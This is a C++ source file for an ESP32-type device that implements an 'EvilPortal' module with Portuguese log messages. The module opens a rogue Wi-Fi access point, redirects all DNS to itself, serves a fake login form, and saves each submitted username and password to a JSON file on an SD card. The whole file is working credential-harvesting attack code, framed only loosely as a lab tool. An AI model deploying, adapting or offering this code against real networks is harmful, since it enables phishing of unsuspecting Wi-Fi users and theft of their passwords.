#include "EvilPortal.h"
#include "core/ConfigManager.h"
#include <SD_MMC.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>

static DNSServer dnsServer;
static AsyncWebServer* webServer = nullptr;
static String portal_ssid = "SENTINEL-LAB";
static bool portal_active = false;
static std::vector<PortalCred> credentials;

void EvilPortal::init() {
    portal_active = false;
    credentials.clear();
    Serial.println("[EvilPortal] Modulo inicializado");
}

void EvilPortal::begin(const char* ssid) {
    portal_ssid = ssid;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid);
    dnsServer.start(53, "*", WiFi.softAPIP());

    webServer = new AsyncWebServer(80);
    webServer->on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/html", "<html><body><h1>LAB PORTAL</h1><form method='POST'>User:<input name='u'><br>Pass:<input name='p'><br><input type='submit'></form></body></html>");
    });
    webServer->on("/", HTTP_POST, [](AsyncWebServerRequest *request) {
        if (request->hasParam("u", true) && request->hasParam("p", true)) {
            String u = request->getParam("u", true)->value();
            String p = request->getParam("p", true)->value();
            EvilPortal::addCredential(u.c_str(), p.c_str());
        }
        request->send(200, "text/html", "<html><body><h1>Obrigado</h1></body></html>");
    });
    webServer->begin();
    portal_active = true;
    Serial.printf("[EvilPortal] Portal ativo: %s\n", ssid);
}

void EvilPortal::stop() {
    if (webServer) { webServer->end(); delete webServer; webServer = nullptr; }
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    portal_active = false;
    Serial.println("[EvilPortal] Portal parado");
}

void EvilPortal::loop() {
    if (portal_active) dnsServer.processNextRequest();
}

bool EvilPortal::isActive() { return portal_active; }

void EvilPortal::setTemplate(const char* path) {
    Serial.printf("[EvilPortal] Template: %s\n", path);
}

void EvilPortal::addCredential(const char* user, const char* pass) {
    PortalCred c;
    c.username = user;
    c.password = pass;
    c.time = millis();
    credentials.push_back(c);
    saveCredentials();
    Serial.printf("[EvilPortal] Credencial: %s\n", user);
}

int EvilPortal::getCredentialCount() { return credentials.size(); }

bool EvilPortal::saveCredentials() {
    if (!SD_MMC.begin("/sd", true)) return false;
    File f = SD_MMC.open("/portal_creds.json", FILE_WRITE);
    if (!f) return false;
    f.print("[");
    for (size_t i = 0; i < credentials.size(); i++) {
        if (i > 0) f.print(",");
        char buf[256];
        snprintf(buf, sizeof(buf), "{\"u\":\"%s\",\"p\":\"%s\"}",
                 credentials[i].username.c_str(), credentials[i].password.c_str());
        f.print(buf);
    }
    f.print("]");
    f.close();
    return true;
}
